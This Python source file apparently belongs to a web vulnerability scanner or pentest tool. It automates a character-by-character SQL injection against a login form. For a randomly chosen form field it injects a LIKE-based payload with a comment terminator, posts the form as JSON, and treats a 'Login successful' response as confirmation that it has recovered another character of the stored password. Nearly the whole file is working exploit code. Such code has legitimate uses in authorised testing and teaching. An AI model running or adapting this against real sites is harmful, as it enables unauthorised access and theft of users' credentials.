import requests
import time
import random
import logger

def non_blind(form):

    load = ""

# Define the login URL and parameters
# username = "admin"  # Assuming 'admin' is the username
# password_param = "password"  # Assuming 'password' is the parameter to inject

# Initialize an empty password string

    # form = {
    #     'url': 'http://localhost:8080/login',
    #     'body': [
    #                 {'name': 'userName', 'value': 'admin'},
    #                 {'name': 'password', 'value': payload}
    #     ]
    # }
    
    num_of_params = len(form['body'])
    
    index = random.randint(0, num_of_params - 1)
    
    param_name = form['body'][index]['name']
    
    print("Trying to find password for parameter:", param_name)
    
# List of characters to try for the password
    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    max_password_length = 20  # Set a reasonable limit for the password length
    max_runtime = 600  # Maximum total runtime in seconds (10 minutes)

    start_time = time.time()

# Loop to find each character of the password
    while len(load) < max_password_length:
        found_char = False
        for char in characters:
            if test_payload(form, param_name, load, char):
                load += char
                print("Found character:", char)
                print("Current password:", load)
                found_char = True
                break
        
        # If no character was found or maximum runtime exceeded, break out of the loop
        if not found_char or (time.time() - start_time) > max_runtime:
            print("No more characters found or maximum runtime exceeded. Ending search.")
            break

    # Print the final password once found
    print("Final keyload:", load)




# Function to test the payload
def test_payload(form, param, load, char):
    # Construct the payload for SQL injection
    payload = f"' OR {param} LIKE '{load + char}%' -- "  # Adding SQL comment to ignore rest of the query
    headers = {'Content-Type': 'application/json'}

    # Construct the data dictionary for the POST request
    # form = {
    #     'url': 'http://localhost:8080/login',
    #     'body': [
    #                 {'name': 'userName', 'value': 'admin'},
    #                 {'name': 'password', 'value': payload}
    #     ]
    # }
    
    payloads = {
        "basic": "a123",
        "name": "John Doe",
        "userName": "Asaf",
        "username": "admin",  # Assuming 'admin' is the username
        "user": "admin",  # Assuming 'admin' is the username
        "email": "johndoe@example.com",
        "password": "securepassword123"
    }
    
    url = form['url']
    
    
    new_object = {}

    for obj in form['body']:
        
        if obj['name'] == param:
            obj['value'] = payload
        elif obj['name'] in payloads:
            obj['value'] = payloads[obj['name']]
        else:
            obj['value'] = 'a12345678'
        # הכנס את הערך של name כמפתח באובייקט החדש עם הערך של value
        new_object[obj['name']] = obj['value']

    # Send the POST request with a timeout
    try:
        response = requests.post(url, headers=headers, json=new_object, timeout=5)
        response.raise_for_status()  # Raise an exception for 4xx/5xx errors
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return False
    
    # Print the payload and response text for debugging
    # print("Trying payload:", payload)
    if response.status_code == 200:
    # print("Response status code:", response.status_code)
        print("Response text:", response.text)
        logger.log_response(response.text)
    
    # Check if the login was successful based on response text
    return "Login successful" in response.text
